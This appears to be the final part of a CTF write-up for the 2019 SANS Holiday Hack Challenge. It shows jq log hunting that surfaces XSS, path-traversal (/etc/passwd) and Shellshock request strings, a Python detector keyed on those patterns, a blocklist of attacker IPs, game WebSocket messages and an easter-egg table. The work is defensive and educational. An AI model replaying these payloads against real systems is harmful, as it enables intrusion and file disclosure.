<span class="gray1">$</span> <span class="green">cat</span> http.log | <span class="green">jq</span> <span class="red">'.[] | select(.user_agent|test("Metasploit")) |.uri,.["id.orig_h"]'</span>
 "/PEAR.pdf"
 "203.68.29.5"
 "/api/weather?station_id=&lt;script>alert('automatedscanning');</script>"
 "84.147.231.129"

<span class="gray1">$</span> <span class="green">cat</span> http.log | <span class="green">jq</span> <span class="red">'.[] | select(.user_agent|test("MSSIE")) |.uri,.["id.orig_h"]'</span>
 "/api/weather?station_id=*"
 "226.240.188.154"
 "/api/login?id=/../../../../../../../../../etc/passwd"
 "187.178.169.123"

<span class="gray1">$</span> <span class="green">cat</span> http.log | <span class="green">jq</span> <span class="red">'.[] | select(.user_agent|test("666.0")) |.uri,.["id.orig_h"]'</span>
 "/api/weather?station_id=/etc/passwd"
 "9.206.212.33"
 "/css/freelancer.min.css"
 "42.16.149.112"
</pre>

<p>
Interesting. Each suspicious <code>user_agent</code> is only used one other time. While we did go through these by hand the first time, this is also where automation can come in. The only exception to this is the original attacking IP of 42.103.246.130. Rather than searching manually using <code>jq</code>, we implemented our search strings and <code>user_agent</code> pivoting using Python3. Running this gives us 94 unique IPs that we think are bad. It also gave us the opportunity to print out all of the 'bad' <code>user_agents</code>.
</p>

<pre class="src src-sh">
<span class="green">python3</span> obj12-incomplete.py | <span class="green">wc</span> -<span class="purple">l</span>
       94
</pre>

<p>
List of misspelled or otherwise suspicious <code>user_agents</code>:
</p>

<pre class="example">
HttpBrowser/1.0
Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1)
Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0)
Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0)
Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N
Mozilla/4.0 (compatible; Metasploit RSPEC)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13
Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html)
Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0)
Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
Mozilla/5.0 (Windows NT 6.1; WOW62; rv:53.0) Gecko/20100101 Chrome /53.0
Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tridents/4.0)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR  1.1.4322)
Wget/1.9+cvs-stable (Red Hat modified)
Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; )
Mozilla/5.0 (Windows NT 5.1 ; v.)
CholTBAgent
Mozilla/5.0 WinInet
RookIE/1.0
Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0)
Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30731
Opera/8.81 (Windows-NT 6.1; U; en)
Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729)
Mozilla/4.0 (compatible MSIE 5.0;Windows_98)
Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 500.0)
Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0)
Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS)
Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1
Mozilla/5.0 (Windows NT 10.0;Win64;x64)
</pre>

<p>
The 94 bad IPs we now have are good enough to complete the objective, but the instructions tell us to block the 100 offending IPs, so we really want to find six more. Going back to our original set of bad IPs, we find another odd characteristic in the <code>host</code> field for our Shellshock attackers:
</p>


<pre class="src src-sh">
<span class="gray1">$</span> <span class="green">cat</span> http.log | <span class="green">jq</span> <span class="red">'.[] | select(.user_agent|test("bin/")) | .host'</span>
 "ssrf.elfu.org"
 "ssrf.elfu.org"
 "ssrf.elfu.org"
 "ssrf.elfu.org"
 "ssrf.elfu.org"
 "ssrf.elfu.org"
</pre>

<p>
Misspelling of the <code>host</code> as well. If we pivot on that we get 12 IPs, 6 of which are new:
</p>

<pre class="src src-sh">
<span class="gray1">$</span> <span class="green">cat</span> http.log | <span class="green">jq</span> <span class="red">'.[] | select(.host|test("ssrf")) | .["id.orig_h"]'</span> | <span class="green">wc</span> -<span class="purple">l</span>
       12
</pre>

<p>
Adding 'ssrf' to our search parameters in our Python script and a little tweak to the output to join it with commas, we have our 100 bad IPs.
</p>

<pre class="src src-sh">
<span class="green">python3</span> obj12.py
42.103.246.250,56.5.47.137,19.235.69.221,69.221.145.150,42.191.112.181,48.66.193.176,49.161.8.58,84.147.231.129,44.74.106.131,106.93.213.219,2.230.60.70,10.155.246.29,225.191.220.138,75.73.228.192,249.34.9.16,27.88.56.114,238.143.78.114,121.7.186.163,106.132.195.153,129.121.121.48,190.245.228.38,34.129.179.28,135.32.99.116,2.240.116.254,45.239.232.245,102.143.16.184,230.246.50.221,131.186.145.73,253.182.102.55,229.133.163.235,23.49.177.78,223.149.180.133,187.178.169.123,116.116.98.205,9.206.212.33,28.169.41.122,68.115.251.76,118.196.230.170,173.37.160.150,81.14.204.154,135.203.243.43,186.28.46.179,13.39.153.254,111.81.145.191,0.216.249.31,31.254.228.4,32.168.17.54,6.144.27.227,220.132.33.81,9.95.128.208,83.0.8.119,23.79.123.99,150.45.133.97,229.229.189.246,155.129.97.35,72.183.132.206,227.110.45.126,61.110.82.125,65.153.114.120,123.127.233.97,95.166.116.45,80.244.147.207,168.66.108.62,200.75.228.240,118.26.57.38,42.127.244.30,217.132.156.225,252.122.243.212,22.34.153.164,44.164.136.41,203.68.29.5,97.220.93.190,158.171.84.209,34.155.174.167,104.179.109.113,66.116.147.181,140.60.154.239,50.154.111.0,92.213.148.0,31.116.232.143,126.102.12.53,187.152.203.243,37.216.249.50,250.22.86.40,231.179.108.238,103.235.93.133,253.65.40.39,142.128.135.10,226.102.56.13,185.19.7.133,87.195.80.126,148.146.134.52,53.160.218.44,249.237.77.152,10.122.158.57,226.240.188.154,29.0.183.220,42.16.149.112,249.90.116.138,42.103.246.130
</pre>

<p>
Pasting this into the firewall input on srf.elfu.org and clicking DENY will fix our bad weather readings and allow Santa to deliver presents. 
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #586e75;">#</span><span style="color: #657b83;">!/usr/bin/env python3</span>

<span style="color: #6c71c4;">import</span> json


<span style="color: #6c71c4;">def</span> <span style="color: #268bd2;">add_ua</span>(my_dict, ua):
    <span style="color: #839496;">"""</span>
<span style="color: #839496;">    Sets/increments the count of how many times a user_agent has been seen</span>

<span style="color: #839496;">    Args:</span>
<span style="color: #839496;">        my_dict(dict): the dictionary you are using to track this</span>
<span style="color: #839496;">            user_agent</span>
<span style="color: #839496;">        ua(str): the user_agent seen</span>

<span style="color: #839496;">    Returns:</span>
<span style="color: #839496;">        my_dict(dict): key and value pairs of user_agent and count</span>
<span style="color: #839496;">    """</span>
    <span style="color: #6c71c4;">if</span> ua <span style="color: #6c71c4;">in</span> my_dict:
        <span style="color: #dc322f;">my_dict</span>[ua] += 1
    <span style="color: #6c71c4;">else</span>:
        <span style="color: #dc322f;">my_dict</span>[ua] = 1

    <span style="color: #6c71c4;">return</span> my_dict


<span style="color: #6c71c4;">def</span> <span style="color: #268bd2;">search_json</span>(my_json):
    <span style="color: #839496;">"""</span>
<span style="color: #839496;">    Look for bad things in the json fields</span>

<span style="color: #839496;">    Args:</span>
<span style="color: #839496;">        my_json(json): the json containing all the data</span>

<span style="color: #839496;">    Returns:</span>
<span style="color: #839496;">        All of these are a key and then a value of count thanks to add_ua()</span>

<span style="color: #839496;">        ua_dict(dict): all of the user_agents seen</span>
<span style="color: #839496;">        bad_ua_dict(dict): known bad user_agents</span>
<span style="color: #839496;">        bad_hosts(dict): known bad hosts</span>
<span style="color: #839496;">    """</span>
    <span style="color: #dc322f;">ua_dict</span> = {}
    <span style="color: #dc322f;">bad_ua_dict</span> = {}
    <span style="color: #dc322f;">bad_hosts</span> = {}

    <span style="color: #586e75;">#                 </span><span style="color: #657b83;">Match       Fields</span>
    <span style="color: #dc322f;">bad_traffic</span> = { <span style="color: #859900;">"&lt;script"</span>: [<span style="color: #859900;">"uri"</span>, <span style="color: #859900;">"user_agent"</span>, <span style="color: #859900;">"host"</span>], <span style="color: #586e75;"># </span><span style="color: #657b83;">XSS</span>
                    <span style="color: #859900;">"etc/passwd"</span>: [<span style="color: #859900;">"uri"</span>, <span style="color: #859900;">"user_agent"</span>, <span style="color: #859900;">"host"</span>], <span style="color: #586e75;"># </span><span style="color: #657b83;">LFI</span>
                    <span style="color: #859900;">"SELECT"</span>: [<span style="color: #859900;">"uri"</span>, <span style="color: #859900;">"user_agent"</span>, <span style="color: #859900;">"host"</span>], <span style="color: #586e75;"># </span><span style="color: #657b83;">SQLi</span>
                    <span style="color: #859900;">"ssrf"</span>: [<span style="color: #859900;">"uri"</span>, <span style="color: #859900;">"user_agent"</span>, <span style="color: #859900;">"host"</span>], <span style="color: #586e75;"># </span><span style="color: #657b83;">SSRF</span>
                    <span style="color: #859900;">"bin/"</span>: [<span style="color: #859900;">"user_agent"</span>], <span style="color: #586e75;"># </span><span style="color: #657b83;">Shellshock</span>
                  }

    <span style="color: #6c71c4;">for</span> obj <span style="color: #6c71c4;">in</span> my_json:
        <span style="color: #dc322f;">ua_dict</span> = add_ua(ua_dict, obj[<span style="color: #859900;">"user_agent"</span>])
        <span style="color: #6c71c4;">for</span> bstr, fields <span style="color: #6c71c4;">in</span> bad_traffic.items():
            <span style="color: #6c71c4;">for</span> field <span style="color: #6c71c4;">in</span> fields:
                <span style="color: #6c71c4;">if</span> bstr <span style="color: #6c71c4;">in</span> obj[field]:
                    <span style="color: #586e75;"># </span><span style="color: #657b83;">we'll be pivoting on user_agent</span>
                    bad_hosts[obj[<span style="color: #859900;">"id.orig_h"</span>]] = obj[<span style="color: #859900;">"user_agent"</span>]
                    <span style="color: #dc322f;">bad_ua_dict</span> = add_ua(bad_ua_dict, obj[<span style="color: #859900;">"user_agent"</span>])

    <span style="color: #6c71c4;">return</span> ua_dict, bad_ua_dict, bad_hosts


<span style="color: #6c71c4;">def</span> <span style="color: #268bd2;">find_doubles</span>(bad_ua_dict, ua_dict):
    <span style="color: #839496;">"""</span>
<span style="color: #839496;">    We noticed a pattern when manually pivoting on the known bad traffic.</span>
<span style="color: #839496;">    A 'bad' UA (fairly obvious mispellings, etc), would only be used one</span>
<span style="color: #839496;">    extra time</span>

<span style="color: #839496;">    Args:</span>
<span style="color: #839496;">        bad_ua_dict(dict): known bad user agents and their count</span>

<span style="color: #839496;">    Returns:</span>
<span style="color: #839496;">        final_bad_ua(list): our final list of bad IPs based on user_agent</span>
<span style="color: #839496;">    """</span>
    <span style="color: #dc322f;">final_bad_ua</span> = []
    <span style="color: #6c71c4;">for</span> bua <span style="color: #6c71c4;">in</span> bad_ua_dict:
        <span style="color: #6c71c4;">if</span> ua_dict[bua] == 2:
            final_bad_ua.append(bua)

    <span style="color: #6c71c4;">return</span> final_bad_ua


<span style="color: #6c71c4;">def</span> <span style="color: #268bd2;">ua_pivot</span>(my_json, bad_hosts, final_bad_ua):
    <span style="color: #839496;">"""</span>
<span style="color: #839496;">    Now that we have our known real bad UAs, we cycle back through the json</span>

<span style="color: #839496;">    Args:</span>
<span style="color: #839496;">        my_json(json): the json containing all the data</span>
<span style="color: #839496;">        bad_hosts(dict): known bad hosts</span>
<span style="color: #839496;">        final_bad_ua(list): our final list of bad IPs based on user_agent</span>

<span style="color: #839496;">    Returns:</span>
<span style="color: #839496;">        bad_hosts(dict): known bad hosts</span>
<span style="color: #839496;">    """</span>
    <span style="color: #6c71c4;">for</span> obj <span style="color: #6c71c4;">in</span> my_json:
        <span style="color: #6c71c4;">if</span> obj[<span style="color: #859900;">"user_agent"</span>] <span style="color: #6c71c4;">in</span> final_bad_ua:
            bad_hosts[obj[<span style="color: #859900;">"id.orig_h"</span>]] = obj[<span style="color: #859900;">"user_agent"</span>]

    <span style="color: #6c71c4;">return</span> bad_hosts


<span style="color: #6c71c4;">def</span> <span style="color: #268bd2;">main</span>():
    <span style="color: #6c71c4;">with</span> <span style="color: #2aa198;">open</span>(<span style="color: #859900;">"http.log"</span>, <span style="color: #859900;">"r"</span>) <span style="color: #6c71c4;">as</span> logf:
        <span style="color: #dc322f;">my_json</span> = json.load(logf)

    <span style="color: #dc322f;">ua_dict</span>, <span style="color: #dc322f;">bad_ua_dict</span>, <span style="color: #dc322f;">bad_hosts</span> = search_json(my_json)
    <span style="color: #dc322f;">final_bad_ua</span> = find_doubles(bad_ua_dict, ua_dict)
    <span style="color: #dc322f;">bad_hosts</span> = ua_pivot(my_json, bad_hosts, final_bad_ua)

    <span style="color: #586e75;"># </span><span style="color: #657b83;">Plus the original attacker (whose UA violates the =2 rule)</span>
    <span style="color: #dc322f;">bad_hosts</span>[
        <span style="color: #859900;">"42.103.246.130"</span>
    ] = <span style="color: #859900;">"don't care, but we did find it based on it's history via UA manually"</span>

    <span style="color: #6c71c4;">print</span>(<span style="color: #859900;">", "</span>.join(bad_hosts))


<span style="color: #6c71c4;">if</span> <span style="color: #2aa198;">__name__</span> == <span style="color: #859900;">"__main__"</span>:
    main()
</pre>
</div>


<div class="figure">
<p><img src="./imgs/obj_12/success.png" alt="success.png" width="75%" />
</p>
<p><span class="figure-number">Figure 85: </span>RID=0807198508261964</p>
</div>
</div>
</div>
</div>
</div>

<div id="outline-container-orgbc0b46f" class="outline-2">
<h2 id="orgbc0b46f">KringleCon</h2>
<div class="outline-text-2" id="text-orgbc0b46f">
</div>
<div id="outline-container-org5000f7f" class="outline-3">
<h3 id="org5000f7f">The Campus</h3>
<div class="outline-text-3" id="text-org5000f7f">
</div>
<div id="outline-container-orgc13ab5a" class="outline-4">
<h4 id="orgc13ab5a">Interacting with the Game</h4>
<div class="outline-text-4" id="text-orgc13ab5a">
<p>
We tried out <a href="https://github.com/vi/websocat">websocat</a> for interacting with the game. For example, to chat with a character:
</p>

<pre class="src">
<span class="green">websocat</span> wss://2019.kringlecon.com/ws | <span class="green">grep</span> PSSST
<span class="green">{"type":"WS_LOGIN","usernameOrEmail":"demo","password":"myvoice"}</span>
<span class="green">{"type":"HELLO_ENTITY","entityType":"npc","id":"krampus-netwars"}</span>
<span class="red">{"type":"PSSST","whisper":{"2407823":{"cid":2407823,"uid":"krampus-netwars","username":"Krampus",
 "type":2,"avatar":"npc","ts":1578968239943,
 "text":"..."}},
"recipient":{"uid":"192","username":"demo","type":1}}
</span>
</pre>

<p>
You can also move around, with something like <code>{"type":"MOVE_USER","loc":{"16647":[4,0]},"areaId":"sleighshop"}</code>.
</p>
</div>
</div>

<div id="outline-container-orgfc095b7" class="outline-4">
<h4 id="jason"><a id="orgfc095b7"></a>Finding Jason</h4>
<div class="outline-text-4" id="text-jason">
<p>
Jason was hanging out among quite literally a huge pile of teeth in the Bell Tower:
</p>


<div class="figure">
<p><img src="./imgs/kringlecon/jason.png" alt="jason.png" width="40%" />
</p>
<p><span class="figure-number">Figure 86: </span>It's Jason!</p>
</div>

<p>
By playing around with the WebSocket messages
<code>{"type":"HELLO_ENTITY","entityType":"npc","id":"plant"}</code>, we were
able to find Jason a second time!
</p>

<div class="chat">
<p>
Hi, my name is Jason!
</p>

<p>
Welcome to KringleCon!
</p>

<p>
&#x2026;
</p>

<p>
&#x2026;
</p>

<p>
&#x2026;
</p>

<p>
&#x2026;
</p>

<p>
&#x2026;
</p>

<p>
&#x2026;
</p>

<p>
&#x2026;
</p>

<p>
&#x2026;
</p>

<p>
&#x2026;
</p>

<p>
We miss you psmitty
</p>

</div>
</div>
</div>

<div id="outline-container-orgfa28c9f" class="outline-4">
<h4 id="maps"><a id="orgfa28c9f"></a>Maps</h4>
<div class="outline-text-4" id="text-maps">

<div class="figure">
<p><img src="./imgs/kringlecon/whiteboard_map.png" alt="whiteboard_map.png" width="60%" />
</p>
<p><span class="figure-number">Figure 87: </span>The Whiteboard Draft</p>
</div>

<p>
As usual, we kept a draft of the map on the whiteboard in our "War
Room."  This year however, we decided to take a 3D direction (using
Sketchup) for detailing the map of campus.
</p>


<div class="figure">
<p><img src="./imgs/kringlecon/Train_Station.png" alt="Train_Station.png" width="75%" />
</p>
<p><span class="figure-number">Figure 88: </span>The Train Station</p>
</div>


<div class="figure">
<p><img src="./imgs/kringlecon/The_Quad.png" alt="The_Quad.png" width="75%" />
</p>
<p><span class="figure-number">Figure 89: </span>The Quad</p>
</div>


<div class="figure">
<p><img src="./imgs/kringlecon/Student_Union.png" alt="Student_Union.png" width="75%" />
</p>
<p><span class="figure-number">Figure 90: </span>Student Union</p>
</div>


<div class="figure">
<p><img src="./imgs/kringlecon/Hermey_Hall.png" alt="Hermey_Hall.png" width="75%" />
</p>
<p><span class="figure-number">Figure 91: </span>Hermey Hall, NetWars, Speaker UNpreparedness Room</p>
</div>


<div class="figure">
<p><img src="./imgs/kringlecon/Laboratory.png" alt="Laboratory.png" width="75%" />
</p>
<p><span class="figure-number">Figure 92: </span>Laboratory</p>
</div>


<div class="figure">
<p><img src="./imgs/kringlecon/Dormitory.png" alt="Dormitory.png" width="75%" />
</p>
<p><span class="figure-number">Figure 93: </span>Dormitory, Minty's Room, Closet</p>
</div>


<div class="figure">
<p><img src="./imgs/kringlecon/Steam_Tunnels.png" alt="Steam_Tunnels.png" width="75%" />
</p>
<p><span class="figure-number">Figure 94: </span>Steam Tunnels</p>
</div>


<div class="figure">
<p><img src="./imgs/kringlecon/Sleigh_Workshop.png" alt="Sleigh_Workshop.png" width="75%" />
</p>
<p><span class="figure-number">Figure 95: </span>Sleigh Workshop</p>
</div>


<div class="figure">
<p><img src="./imgs/kringlecon/Bell_Tower.png" alt="Bell_Tower.png" width="75%" />
</p>
<p><span class="figure-number">Figure 96: </span>The Bell Tower</p>
</div>
</div>
</div>
</div>
</div>

<div id="outline-container-org96f0b2d" class="outline-2">
<h2 id="easter_eggs"><a id="org96f0b2d"></a>Easter Eggs</h2>
<div class="outline-text-2" id="text-easter_eggs">

<div class="figure">
<p><img src="./imgs/a_easter_eggs/1_JebediahSpringfield.png" alt="1_JebediahSpringfield.png" />
</p>
<p><span class="figure-number">Figure 97: </span>Searching for Easter Eggs like Jebediah Springfield</p>
</div>

<p>
We're always amazed each year at how many jokes and easter eggs get packed into the challenge. Here are what we found this year:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Easter Egg</th>
<th scope="col" class="org-left">Reference</th>
<th scope="col" class="org-left">Challenge</th>
<th scope="col" class="org-left">Location</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Holiday Hack Trail</td>
<td class="org-left">Oregon Trail</td>
<td class="org-left"><a href="#term_trail">Holiday Hack Trail</a></td>
<td class="org-left">N/A</td>
</tr>

<tr>
<td class="org-left">Jebediah Springfield</td>
<td class="org-left">Simpsons</td>
<td class="org-left"><a href="#term_trail">Holiday Hack Trail</a></td>
<td class="org-left">Default PlayerID</td>
</tr>

<tr>
<td class="org-left">I'm sorry, but our princess is in another North Pole.</td>
<td class="org-left">Super Mario Bros.</td>
<td class="org-left"><a href="#term_trail">Holiday Hack Trail</a></td>
<td class="org-left">HTML comment in victory screen</td>
</tr>

<tr>
<td class="org-left">trail-mix-cookie</td>
<td class="org-left">Trail mix</td>
<td class="org-left"><a href="#term_trail">Holiday Hack Trail</a></td>
<td class="org-left">http cookie</td>
</tr>

<tr>
<td class="org-left">darealmvp</td>
<td class="org-left"><a href="https://youtu.be/NmRJgKbibB8?t=65">Kevin Durant speech</a></td>
<td class="org-left"><a href="#term_path">Path</a></td>
<td class="org-left">The real ls</td>
</tr>

<tr>
<td class="org-left">Kent Tinseltooth (his braces talk in the movie)</td>
<td class="org-left">Real Genius</td>
<td class="org-left"><a href="#term_iptables">Smart Braces</a></td>
<td class="org-left">Student Union</td>
</tr>

<tr>
<td class="org-left">Voice in Kent's head is like when God talked to him</td>
<td class="org-left">Real Genius</td>
<td class="org-left"><a href="#term_iptables">Smart Braces</a></td>
<td class="org-left">Student Union</td>
</tr>

<tr>
<td class="org-left">echo complete &gt; /tmp/A95C530A7AF5F492A74499E70578D150.txt md5 of asdfasdfasdf</td>
<td class="org-left">General Nerdery</td>
<td class="org-left"><a href="#term_iptables">Smart Braces</a></td>
<td class="org-left">N/A</td>
</tr>

<tr>
<td class="org-left">Laser</td>
<td class="org-left">Real Genius</td>
<td class="org-left"><a href="#term_powershell">Xmas Cheer Laser</a></td>
<td class="org-left">Hermey Hall</td>
</tr>

<tr>
<td class="org-left"><a href="http://localhost:1225">http://localhost:1225</a> -&gt; 12/25</td>
<td class="org-left">Christmas</td>
<td class="org-left"><a href="#term_powershell">Xmas Cheer Laser</a></td>
<td class="org-left">Laser Server</td>
</tr>

<tr>
<td class="org-left">Santa holding an umbrella</td>
<td class="org-left">Mary Poppins</td>
<td class="org-left"><a href="#obj0">Objective 0</a></td>
<td class="org-left">The Quad</td>
</tr>

<tr>
<td class="org-left">Two Turtle Doves Michael and Jane</td>
<td class="org-left">Mary Poppins</td>
<td class="org-left"><a href="#obj2">Objective 2</a></td>
<td class="org-left">Student Union</td>
</tr>

<tr>
<td class="org-left">Rue the day</td>
<td class="org-left">Real Genius</td>
<td class="org-left"><a href="#obj6">Objective 6</a></td>
<td class="org-left">Splunk chat with Kent</td>
</tr>

<tr>
<td class="org-left">Alice Bluebird</td>
<td class="org-left">Alice Through the Looking Glass</td>
<td class="org-left"><a href="#obj6">Objective 6</a></td>
<td class="org-left">Chat</td>
</tr>

<tr>
<td class="org-left">Krampus Hollyfeld is Lazlo Hollyfeld</td>
<td class="org-left">Real Genius</td>
<td class="org-left"><a href="#obj7">Objective 7</a> and others</td>
<td class="org-left">N/A</td>
</tr>

<tr>
<td class="org-left">Frido Sleigh Contest/Frito Lay Contest entries</td>
<td class="org-left">Real Genius</td>
<td class="org-left"><a href="#obj8">Objective 8</a></td>
<td class="org-left">Steam Tunnels</td>
</tr>

<tr>
<td class="org-left">Machine Learning Via TinselFlow</td>
<td class="org-left">Tensorflow</td>
<td class="org-left"><a href="#obj10">Objective 10</a></td>
<td class="org-left">Decrypted PDF</td>
</tr>

<tr>
<td class="org-left">Parents of spoiled eggs</td>
<td class="org-left">Willy Wonka (Veruca?)</td>
<td class="org-left"><a href="#obj11">Objective 11</a></td>
<td class="org-left">Lock 8</td>
</tr>

<tr>
<td class="org-left">Ludicrous Speed has a plaid background</td>
<td class="org-left">SpaceBalls</td>
<td class="org-left"><a href="#obj11">Objective 11</a></td>
<td class="org-left">Sleigh Shop Door</td>
</tr>

<tr>
<td class="org-left">rank: Ice Ice Baby</td>
<td class="org-left">Vanilla Ice - Ice Ice Baby</td>
<td class="org-left"><a href="#obj12">Objective 12</a></td>
<td class="org-left">Station Weather</td>
</tr>

<tr>
<td class="org-left">0807198508261964 is the release dates of Real Genius and Mary Poppins</td>
<td class="org-left">Real Genius/Mary Poppins</td>
<td class="org-left"><a href="#obj12">Objective 12</a></td>
<td class="org-left">Sleigh Workshop</td>
</tr>

<tr>
<td class="org-left">&lt;!&#x2013; &lt;div class=“secondary”&gt;CODE: 8675309&lt;/div&gt; &#x2013;&gt;</td>
<td class="org-left">Tommy Tutone - 8675309</td>
<td class="org-left"><a href="#obj12">Objective 12</a></td>
<td class="org-left">alert.html</td>
</tr>

<tr>
<td class="org-left">You see, while he sleeps (He Sees You While You're Sleeping)</td>
<td class="org-left">Santa Claus</td>
<td class="org-left">N/A</td>
<td class="org-left">Main logo: Ille te videt dum dormit</td>
</tr>

<tr>
<td class="org-left">Hermey the Elf</td>
<td class="org-left">Rudolph</td>
<td class="org-left">N/A</td>
<td class="org-left">Hermey Hall</td>
</tr>

<tr>
<td class="org-left">Dr. Banas' student Kent</td>
<td class="org-left">Real Genius</td>
<td class="org-left">N/A</td>
<td class="org-left">Laboratory</td>
</tr>

<tr>
<td class="org-left">College Campus</td>
<td class="org-left">Real Genius</td>
<td class="org-left">N/A</td>
<td class="org-left">All</td>
</tr>

<tr>
<td class="org-left">Wall drawings</td>
<td class="org-left">Real Genius</td>
<td class="org-left">N/A</td>
<td class="org-left">Dorm</td>
</tr>

<tr>
<td class="org-left">Fish water cooler</td>
<td class="org-left">Real Genius</td>
<td class="org-left">N/A</td>
<td class="org-left">Minty's Dorm Room</td>
</tr>

<tr>
<td class="org-left">Einstein Picture</td>
<td class="org-left">Real Genius</td>
<td class="org-left">N/A</td>
<td class="org-left">Minty's Dorm Room</td>
</tr>

<tr>
<td class="org-left">This is it</td>
<td class="org-left">Real Genius</td>
<td class="org-left">N/A</td>
<td class="org-left">Minty's Closet</td>
</tr>

<tr>
<td class="org-left">Steam Tunnels</td>
<td class="org-left">Real Genius</td>
<td class="org-left">N/A</td>
<td class="org-left">Steam Tunnels</td>
</tr>

<tr>
<td class="org-left">Dr Banas references Kent picking up his drycleaning</td>
<td class="org-left">Real Genius</td>
<td class="org-left">N/A</td>
<td class="org-left">Laboratory</td>
</tr>

<tr>
<td class="org-left">I got 31.8% of the prizes, though I'll have to figure that out.</td>
<td class="org-left">Real Genius</td>
<td class="org-left">N/A</td>
<td class="org-left">Krampus in the Bell Tower</td>
</tr>

<tr>
<td class="org-left">Dr Banas - Robert Banas played a chimney sweep</td>
<td class="org-left">Mary Poppins</td>
<td class="org-left">N/A</td>
<td class="org-left">Laboratory</td>
</tr>

<tr>
<td class="org-left">Ninjula - Supa Cali Fragile Lipstick</td>
<td class="org-left">Mary Poppins</td>
<td class="org-left">N/A</td>
<td class="org-left">Music in Sleigh Workshop</td>
</tr>

<tr>
<td class="org-left">Ninjula - “Shells popping to be merry. Mary, a villain we’ve encountered this scary. Insane. Remain vigilant and always be wary…”</td>
<td class="org-left">Mary Poppins</td>
<td class="org-left">N/A</td>
<td class="org-left">Music in Sleigh Workshop</td>
</tr>

<tr>
<td class="org-left">Santa - "The more I laugh, the more I fill with glee. And the more the glee, The more I’m a merrier me!"</td>
<td class="org-left">Mary Poppins</td>
<td class="org-left">N/A</td>
<td class="org-left">Santa Claus in the Bell Tower</td>
</tr>

<tr>
<td class="org-left">Golden ticket</td>
<td class="org-left">Willy Wonka</td>
<td class="org-left">N/A</td>
<td class="org-left">holidayhackchallenge.com</td>
</tr>

<tr>
<td class="org-left">Golden ticket, redux</td>
<td class="org-left">Willy Wonka</td>
<td class="org-left">N/A</td>
<td class="org-left">Laptop in NetWars room</td>
</tr>

<tr>
<td class="org-left">rutroh</td>
<td class="org-left">Jetsons &amp; Scooby Doo</td>
<td class="org-left">Mini-games and Terminals</td>
<td class="org-left">conduit.js error message</td>
</tr>

<tr>
<td class="org-left">And I would have gotten away with it too, if it weren't for you meddling kids</td>
<td class="org-left">Scooby Doo</td>
<td class="org-left">N/A</td>
<td class="org-left">Tooth Fairy in the Bell Tower</td>
</tr>

<tr>
<td class="org-left">Ninjula - Everybody wants to look a lot like christmas</td>
<td class="org-left">Tears for Fears - Everybody Wants to Rule the World</td>
<td class="org-left">N/A</td>
<td class="org-left">Music in the Bell Tower</td>
</tr>

<tr>
<td class="org-left">Minty's poster</td>
<td class="org-left">HHC16</td>
<td class="org-left">N/A</td>
<td class="org-left">Behind her bed</td>
</tr>

<tr>
<td class="org-left">Train</td>
<td class="org-left">HHC16</td>
<td class="org-left">N/A</td>
<td class="org-left">Train station</td>
</tr>

<tr>
<td class="org-left">Tardis</td>
<td class="org-left">HHC16</td>
<td class="org-left">N/A</td>
<td class="org-left">Dorm wall</td>
</tr>

<tr>
<td class="org-left">Tin Man</td>
<td class="org-left">HHC17</td>
<td class="org-left">N/A</td>
<td class="org-left">Dorm wall</td>
</tr>
</tbody>
</table>
</div>
</div>

<div id="outline-container-orgb4e1350" class="outline-2">
<h2 id="orgb4e1350">Conclusion</h2>
<div class="outline-text-2" id="text-orgb4e1350">
<p>
Thank you to ElfU for hosting KringleCon 2: Turtle Doves! We learned a
lot, and along the way, discovered the secret in Minty's closet, that
Krampus sent the doves after some scraps of paper, and detected and
thwarted the Tooth Fairy's dastardly attempts to destroy the holiday season.
</p>

<p>
On a personal note, it was a treat to see ourselves as part of the Holiday Hack Trail! We even figured out how to give each other dysentery, even though it wasn't easy&#x2026;
</p>

<p>
Thank you to all the great speakers and, of course, to Santa for
putting on this conference for a second year. Hopefully next year will
go much more smoothly&#x2026;
</p>


<div class="figure">
<p><img src="./imgs/kringlecon/cliffhanger_note.png" alt="cliffhanger_note.png" width="50%" />
</p>
<p><span class="figure-number">Figure 98: </span>Cliffhanger Note</p>
</div>

<hr>


<div class="figure">
